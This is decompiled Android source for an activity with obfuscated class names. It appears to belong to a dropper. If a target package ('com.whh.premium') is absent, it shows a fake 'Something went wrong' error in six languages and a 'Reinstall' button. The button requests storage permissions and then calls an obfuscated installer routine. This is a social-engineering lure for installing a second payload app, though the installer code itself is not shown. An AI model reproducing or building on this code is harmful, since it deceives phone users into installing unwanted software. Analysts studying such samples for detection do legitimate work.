package com.appd.instll;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.appd.R;
import java.util.Locale;

/* loaded from: classes2.dex */
public class dapenvuwejylecxmemckzigsvucpcz3 extends Activity {
    private static final int INSTALL_PERMISSION_CODE = 2;
    private static final int STORAGE_PERMISSION_CODE = 1;
    public static String TargetBaseid = "com.whh.premium";
    Button upbtn = null;
    TextView titleview = null;
    TextView decripview = null;
    Context mContext = null;

    /* JADX INFO: Access modifiers changed from: private */
    public boolean checkPermissions() {
        return ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0 && ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0;
    }

    public static boolean isAppAvailable(Context context, String str) {
        try {
            context.getPackageManager().getApplicationInfo(str, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_EXTERNAL_STORAGE"}, 1);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Context applicationContext = getApplicationContext();
        this.mContext = applicationContext;
        if (isAppAvailable(applicationContext, TargetBaseid)) {
            Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(TargetBaseid);
            launchIntentForPackage.addFlags(268435456);
            launchIntentForPackage.addFlags(536870912);
            startActivity(launchIntentForPackage);
            finish();
            return;
        }
        setContentView(R.layout.exptionactivity);
        this.titleview = (TextView) findViewById(R.id.mytitle);
        this.decripview = (TextView) findViewById(R.id.mydiscrip);
        this.upbtn = (Button) findViewById(R.id.fixbtn);
        String language = Locale.getDefault().getLanguage();
        char c = 65535;
        int hashCode = language.hashCode();
        if (hashCode != 3121) {
            if (hashCode != 3241) {
                if (hashCode != 3588) {
                    if (hashCode != 3651) {
                        if (hashCode != 3710) {
                            if (hashCode == 3886 && language.equals("zh")) {
                                c = 2;
                            }
                        } else if (language.equals("tr")) {
                            c = 3;
                        }
                    } else if (language.equals("ru")) {
                        c = 5;
                    }
                } else if (language.equals("pt")) {
                    c = 4;
                }
            } else if (language.equals("en")) {
                c = 0;
            }
        } else if (language.equals("ar")) {
            c = 1;
        }
        if (c == 0) {
            this.titleview.setText("Something went wrong");
            this.decripview.setText("Oops! We encountered a problem. To fix it, please tap 'Reinstall' below.");
            this.upbtn.setText("Reinstall");
        } else if (c == 1) {
            this.titleview.setText("هناك خطأ ما");
            this.decripview.setText("واجهتنا مشكلة. لإصلاحها ، يرجى النقر فوق 'إعادة التثبيت' أدناه.");
            this.upbtn.setText("إعادة التثبيت");
        } else if (c == 2) {
            this.titleview.setText("出了些问题");
            this.decripview.setText("我们遇到了一个问题。 要修复此问题，请点击下面的'重新安装'。");
            this.upbtn.setText("重新安装");
        } else if (c == 3) {
            this.titleview.setText("Bir şeyler yanlış gitti");
            this.decripview.setText("Bir sorunla karşılaştık. Düzeltmek için lütfen aşağıda 'Yeniden Yükle'ye dokunun.");
            this.upbtn.setText("yeniden yükleme");
        } else if (c == 4) {
            this.titleview.setText("algo deu errado");
            this.decripview.setText("Encontramos um problema. Para corrigi-lo, toque em 'Reinstalar' abaixo.");
            this.upbtn.setText("Reinstalando");
        } else if (c != 5) {
            this.titleview.setText("Something went wrong.");
            this.decripview.setText("We encountered a problem. To fix it, please tap 'Reinstall' below.");
            this.upbtn.setText("Reinstall");
        } else {
            this.titleview.setText("Что-то пошло не так");
            this.decripview.setText("Мы столкнулись с проблемой. Чтобы исправить это, нажмите 'Переустановить' ниже.");
            this.upbtn.setText("Переустановка");
        }
        this.upbtn.setOnClickListener(new View.OnClickListener(this) { // from class: com.appd.instll.dapenvuwejylecxmemckzigsvucpcz3.1
            final dapenvuwejylecxmemckzigsvucpcz3 this$0;

            {
                this.this$0 = this;
            }

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                if (this.this$0.checkPermissions()) {
                    wuiwunabuzhhrmuqncxdphfkapujuw5.install(this.this$0.getApplicationContext());
                } else {
                    this.this$0.requestPermissions();
                }
            }
        });
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 1) {
            if (i != 2 || iArr.length <= 0) {
                return;
            }
            int i2 = iArr[0];
            return;
        }
        if (iArr.length > 0 && iArr[0] == 0 && iArr[1] == 0) {
            wuiwunabuzhhrmuqncxdphfkapujuw5.install(this.mContext);
        }
    }
}
